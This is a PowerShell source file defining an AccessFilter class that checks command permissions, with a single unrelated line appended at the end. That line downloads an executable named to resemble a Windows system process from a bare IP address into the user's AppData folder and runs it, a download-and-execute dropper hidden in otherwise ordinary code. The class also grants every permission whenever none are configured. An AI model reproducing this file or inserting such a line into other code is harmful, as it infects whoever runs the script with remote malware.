

class AccessFilter {

    [hashtable]$Permissions = @{}

    [CommandAuthorizationResult]Authorize([string]$PermissionName) {
        if ($this.Permissions.Count -eq 0) {
            return $true
        } else {
            if (-not $this.Permissions.ContainsKey($PermissionName)) {
                return [CommandAuthorizationResult]::new($false, "Permission [$PermissionName] is not authorized to execute this command")
            } else {
                return $true
            }
        }
    }

    [void]AddPermission([Permission]$Permission) {
        if (-not $this.Permissions.ContainsKey($Permission.ToString())) {
            $this.Permissions.Add($Permission.ToString(), $Permission)
        }
    }

    [void]RemovePermission([Permission]$Permission) {
        if ($this.Permissions.ContainsKey($Permission.ToString())) {
            $this.Permissions.Remove($Permission.ToString())
        }
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

